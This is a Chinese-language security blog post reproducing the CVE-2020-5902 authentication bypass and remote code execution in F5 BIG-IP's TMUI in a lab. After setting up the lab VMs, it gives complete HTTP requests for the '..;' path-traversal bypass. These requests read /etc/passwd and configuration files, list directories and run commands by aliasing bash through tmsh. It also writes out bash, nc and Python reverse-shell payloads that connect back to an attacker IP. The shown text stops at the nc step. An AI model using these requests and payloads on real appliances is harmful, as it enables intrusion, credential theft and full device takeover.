> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247497672&idx=1&sn=aa31b65773592f3618573abad3603b67

#  F5 BIG-IP RCE：重温解析差异导致的身份认证绕过  
原创 Al1ex  七芒星实验室   2025-06-23 23:00  
  
#### 影响范围  
- BIG-IP = 15.1.0  
  
- BIG-IP = 15.0.0  
  
- BIG-IP 14.1.0 - 14.1.2  
  
- BIG-IP 13.1.0 - 13.1.3  
  
- BIG-IP 12.1.0 - 12.1.5  
  
- BIG-IP 11.6.1 - 11.6.5  
  
#### 漏洞类型  
- RCE  
  
- ReadFile  
  
- ListDirectory  
  
- Arbitrary File Upload  
  
#### 利用条件  
- 上述影响范围所列的F5 BIG-IP版本  
  
- 第一种EXP：在RCE以及反弹shell时需要近期有用户登录或者用户会话未过期  
  
- 第二种EXP:  F5 BIG-IP未关闭Hysqldb(密码默认为空，而且在jar包中，不存在更改问题。  
  
#### 漏洞概述  
  
F5 BIG-IP 是美国 F5 公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。  
  
2020年7月初，有安全研究人员公开披露F5 BIG-IP产品的流量管理用户页面 (TMUI)/配置  
实  
用程序的特定页面中存在一处远程代码执行漏洞，并给出测试POC，攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行，进而控制F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等，该漏洞影响控制面板，不影响数据面板。  
#### 漏洞复现  
##### 环境搭建  
###### 虚拟机下载  
  
首先去官网(https://login.f5.com/resource/login.jsp)注册一个账号(ondxbz43867@chacuo.net/12345Qwert)，并登陆：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHJPuYSeMwx6iagHQmJQdkDvkuApbNJXxk0ZQGWdj9Oia4iaQibRsD5npicIg/640?wx_fmt=png "")  
  
之后进入下载页面，在这里我们下载v15.x系列的漏洞版本与修复版本进行分析测试，  
下载页面：  
https://downloads.f5.com/esd/productlines.jsp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHEtoDOLbvDKiceLdu5L2ziaHmtHphQvh4OD8e5XTsatKE87qPmzw8oDxg/640?wx_fmt=png "")  
  
下载存在漏洞的BIG-IP的ova文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHenj3k7UCtibKKZibQFDBG13oibK4W9AQoicRx863FztDg73KIBUh9GiadNQ/640?wx_fmt=png "")  
  
之后  
下载修复版本的BIG-IP的ova文件到本地：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHd1HyADZoUeaYm9X3E9yzMfWqQKUMuZ8rKFicp8B722puFHUAB4zkbuQ/640?wx_fmt=png "")  
###### 虚拟机搭建  
  
将两个ova文件导入VMware Workstations中：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHiaBkctJXvogoficicMicKWvEIHuN8kcBXQKoicIcbWveUQCaxerrMFpOTKQ/640?wx_fmt=png "")  
  
启动之后会要求输入账号密码，BIG默认账号密码为root/default:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHibibxy0fF5VPAp7UoUudibGTS5Nkvrz0Qu8VgqSNI09QlrpO3NxVmk3Fw/640?wx_fmt=png "")  
  
成功登陆之后会要求我们重置密码，这个密码为Web页面的登陆密码(该密码要有一定的复杂度，这里使用  
kvqasdt!q1与  
kvqasdt!q2  
)需要记住：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHEQmsBhJ6JaafsF2toRicSJ8ZzpYibDW6kyTs4Mm1bhdK2fg5ibick0rq3A/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHqEy5Hic5s0deIphHiaOo82XfFQ2EcTPc3DbE6MYJrRSiba3icFOVmXfYibQ/640?wx_fmt=png "")  
  
  
一会儿之后你会看到如下界面信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHxyy3UTPKkvkXOEuwBTX0AMgCibEhunDIjuoThqZzfZSV4QFtW6yXk9g/640?wx_fmt=png "")  
  
之后点击"OK"，然后选择IPV4 IP地址：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHSrroxKcYH7ag7VnjUyiaMIO959Qe0jtc2kugzuwLPBwhoCqJxtuSDicA/640?wx_fmt=png "")  
  
  
之后你会看到当前BIG-IP主机的IP地址信息(BIGIP-15.1.0.0)：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHbzWRbtN7jGxfa6ibf6SEohzGh5qX2VPrQHyV74MoznGEFny5h1vZpOg/640?wx_fmt=png "")  
  
BIGIP-15.1.0.4的IP地址：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHjnIlQOdOVNibklTRuabLMgkyOHnZv869r2Z7rib3ptgwNu0kDcLqcvJQ/640?wx_fmt=png "")  
  
之后在浏览器中使用https://ip地址进行访问：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHgYsWSetzjQJVvaXDq1SR75qXVEU6SLtmOxNic7QVdNicl017n6VAWKaw/640?wx_fmt=png "")  
  
之后使用"admin/之前重置的密码"进行登录认证：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHyUiaibMDAKFzQDnZtMRZMCXWaVBv9BFDUhIsw3UAxRQxibIKPqBAR2DMw/640?wx_fmt=png "")  
  
之后还需要再重置一次登录密码，这里重置为hkn!2gQWsgk，另外一个重置为  
hkn!2gQWsgk1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHl34gF1MDtatzHlvoCNRcJLym2dwD4LqWDBWT9WwiciazpeKbRP2xcNvg/640?wx_fmt=png "")  
  
至此，我们已经拥有一个账号为admin/  
hkn!2gQWsgk的漏洞靶机，和一个账号为  
admin/  
hkn!2gQWsgk1的安全主机，  
下面我们进行简易测试~  
##### 漏洞利用  
###### 文件读取  
  
POC:  

```
系统文件：/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```

  
执行结果：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHlsiaMyIa3En59UmoNUXemSg8vFcXELxwah7BD9ic52RVEn2Gczj5VWVQ/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```


```
配置文件：/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/profile_base.conf
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHmmrINl80JvW4MiaJVdeSHXme3rza8yiclvSbMJibfgg2dtDSkNxUwWLLw/640?wx_fmt=png "")  
  
其余的配置文件如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHL6mTY6AUgdGq8THBqibhxQS0UcL8hlgHqib1ER4tOgOdPDsuMpQxMYJQ/640?wx_fmt=png "")  
  
文件的权限如下所示，可以看到有些文件并没有读权限：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHuU07gS9hfyHyeGgziaFVicvEDqAUOTuxmcicau9wFIqpdF6a5N1SQ5tGg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHX66smibyrGHl9ffan8OEcbfSxiaORSF6pLiaR8H4IulxXZIFKAia3UXwUw/640?wx_fmt=png "")  
  
  
在这里本来还打算读取config/bigip.conf的，结果发现没有读取  
权限  

```
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHAJOHRJ3FkHE5PfCwCX4Ds601RU5uHbRQZ7eq4m4ibOicibNw4e8exxJkQ/640?wx_fmt=png "")  
  
直接读取tmui的web.xml文件：  

```
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/usr/local/www/tmui/WEB-INF/web.xml
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHK26swic8GQsyRZwSUOts2XwxCKhxTFx7PTyqJLtpRWttHbNJia4iaNOaw/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/usr/local/www/tmui/WEB-INF/web.xml HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
其它路径可以参考：  
  
https://github.com/Al1ex/CVE-2020-5902/blob/master/common_path.txt  
###### 列目录项  
  
POC:  

```
/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHcLd6ZtmUxV88ib7sx0WuWbfhePku9iaqsfVI5jtMr7tQ7ibEGERrbdSAw/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

###### 命令执行  
  
方式一：指令别名方式  

```
tmshCmd.jsp?command=create+cli+alias+private+list+command+bash   #先创建执行命令的模式，将list设置为bash的别名
fileSave.jsp?fileName=/tmp/cmd&content=id#向创建的文件中写入要执行的命令
tmshCmd.jsp?command=list+/tmp/cmd                 #利用前面设置的list来执行文件中的命令
tmshCmd.jsp?command=delete+cli+alias+private+list#最后清空list


PS:在操作之前, 首先要登录Web，否则返回数据一直为空,同时在操作之后记得清空list
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH5rCvMALE9iau4UJNLaJmQ0VmqncibhHice83dHGOhJalXL3h5ettibic32w/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHvMDolYbo4iadayPrziaZh8CTRHLygvUtt1IVGbrWjZ1re4yw5Ta1ZBnA/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

  
在未登录情况下会输出为null：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHwa7I99TlQM5TjKDaTkeqfhnibciavsicsWgMgkuzvfHf0SadLfvqqQUpA/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

  
之后模拟用户admin进行登陆  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHWQuG7ZjiaZcFFXdquUmFHeZlXGtiaGicVwo9nWMujtxqZmrcic3dP36zDA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHUDOGqhfnAlTqtXCPfWiaGiauBKpjB02AGCmxWld94ELaudJVUPnu6BNA/640?wx_fmt=png "")  
  
之后模拟攻击者重放之前的请求数据包(此时数据包中的会话信息不变)，第一次执行会出现以下错误提示信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHrhcVDkN1qRcrzHIrBicetrickz8tfXqib2xBGibm1osU23RqtenoJLB4IA/640?wx_fmt=png "")  
  
之后把之前的步骤重新走一遍即可，然后重新执行命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHQrJPa6W83gy9TwKdzuJTPvLzljaibV6LfbExgANLKvtohpicGIiaFebrg/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

  
  
用完之后记得解除：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHx3TB4A9qg4CITiaTUYqPCVQbCQNibmzsKvMc7PqluCEgOl8OekW7q37A/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

  
  
方式二：tmsh命令语法  
  
除了使用上面这种通过alias将bash设置别名来实现命令执行的效果外，我们还可以使用BIG-IP的一些内置的命令，例如：  
- list auth user——查看所有用户  
  
- list auth user admin ——仅仅查看admin用户  
  
有人可能会好奇，为什么方式一中要将bash的别名设置为list，而这里也是tmsh内置的list指令呢？这是因为在WorkspaceUtils.java文件中对operation操作类型有检测，只允许create\delete\list\modify四种类型，这在漏洞分析部分有详细描述~  
  
关于通过tmsh的list命令查看用户信息的描述可参考：https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions  

```
tmshCmd.jsp?command=list+auth+user                      #使用list直接执行命令查看所有用户
tmshCmd.jsp?command=list+auth+user+admin               #使用list直接执行命令查看admin用户
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHib93ojUxHkCXYjBiaa2TQGmia6ibq8ayicR3LKzd9eIFibNaKYESr6UIT7Xw/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
PS:这里补充一句，当用户登录一次之后，即便是用户退出之后，我们依旧可以实施攻击，关键是要用户登录一次，这应该是服务器端的Session过期机制所致  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHPGgASZ4VGYgaMw4RSZdoOegrb4jwpunAH2hHOcJmd2d9qm4YsN1pmw/640?wx_fmt=png "")  
  
依旧执行：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHdoOu5wj2GW4SojjK2CDkE0WJ1Ms5Op9CnibplFhV4JyMv0oKBL6ye3g/640?wx_fmt=png "")  
###### 反弹shell  
  
在反弹shell时我们可以通过上述的RCE来实现，其中第二种方式可能并不适用，在这里我们要通过alias将bash设置别名为list之后实现反弹shell的操作，具体的操作流程如下：  
  
Step 1：首先，创建执行命令的模式，将list设置为bash  

```
tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH0lExpR1EunjPZRDzBHFre2y04bFTbHs352yVUOL4XjJ8O849FA1O0g/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
  
Step 2：创建包含反弹shell的命令并以文本文件形式保存（这里介绍三种反弹shell的方式:bash\nc\python，其余的类似于perl、ruby等不再赘述）  
  
a、bash反弹shell  

```
fileSave.jsp?fileName=/tmp/1.txt&content=bash+-i+>%26/dev/tcp/192.168.174.131/4444+0>%261
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHlUjI4var8PicI3HK0aRy4SqCdsYWcvYob60oawacX5vZzrENzvNExBw/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/1.txt&content=bash+-i+>%26/dev/tcp/192.168.174.131/4444+0>%261 HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
成功写入到/tmp/1.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHE72NWXHsunwwKiaX8RyJGf5tfuvAB8BWec7MpML2icHT6ZHzgaR9Szcw/640?wx_fmt=png "")  
  
b、nc反弹shell  

```
fileSave.jsp?fileName=/tmp/1.txt&content=nc+192.168.174.131+4444+-t+-e+/bin/bash
```

  
F5 BIG-IP主机自带nc,所以这里也可以使用nc来反弹shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHldPca14Nedsdic2CxtfW3mVkibtaaia9ZiaWoTE25azf3rvnUibuERN6J6Q/640?wx_fmt=png "")  
  
操作如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH21oBV1ycUYKCFdoQoRX3iaQo3sHDw9SglAKiaRLx1D843ibmBejTb1qHg/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/1.txt&content=nc+192.168.174.131+4444+-t+-e+/bin/bash HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
成功写入：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHHVQ1UhWWUONRicRHlkaDsEIUYIQjHYgHIpRQhgr6sqwTHsQKs7euGpQ/640?wx_fmt=png "")  
  
c、python反弹shell  

```
fileSave.jsp?fileName=/tmp/1.txt&content=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.174.131&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);'
```

  
  
F5 BIGIP自带python，所以也可以使用python来反弹shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHShdZSr4l42H4Bf21GH3NH5Lswic7Iv04XcL3256fLYic36vUvgrOQqSw/640?wx_fmt=png "")  
  
操作流程如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHt5e6ARnWSvU9w8FKRF8ZAf5gtwutxhp2DK3N07I2fsS8hhVUMia9ibnA/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/1.txt&content=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.174.131&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);' HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
成功写入文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH0LC3Lrt21kHSezV7KJB3CJ2ZmmS1VRqRYzTWKINeUrWVXtKbYVM9wA/640?wx_fmt=png "")  
  
Step 3:反弹shell回来  
  
a、bash反弹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHedevfJicKJYxKkqZyicrJTwc9VsHa63eO6YOuplQ2MMwtpvJL390zFdg/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/1.txt HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHuC965DAXwDYC4grG389cJ723fcdwdKSkkR98u4lQOWP5tQ1eKxpAVw/640?wx_fmt=jpeg "")  
  
b、nc反弹shell  
  
